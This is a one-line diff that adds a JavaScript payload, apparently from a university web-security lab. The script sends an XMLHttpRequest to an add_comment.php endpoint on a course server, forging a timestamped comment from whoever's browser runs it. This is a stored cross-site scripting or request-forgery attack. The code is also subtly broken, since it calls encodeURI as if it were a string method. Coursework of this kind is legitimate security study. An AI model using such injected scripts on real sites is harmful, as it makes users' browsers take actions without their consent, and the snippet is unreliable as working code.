@@ -1,0 +1,1 @@
+var date = new Date();var addComment = new XMLHttpRequest();addComment.open('GET', 'http://csec380-core.csec.rit.edu:86/add_comment.php?id=119&comment=added%20a%20b%20on%20'.concat(date.toString()).encodeURI());addComment.setRequestHeader("X-Requested-With", "XMLHttpRequest");addComment.send();
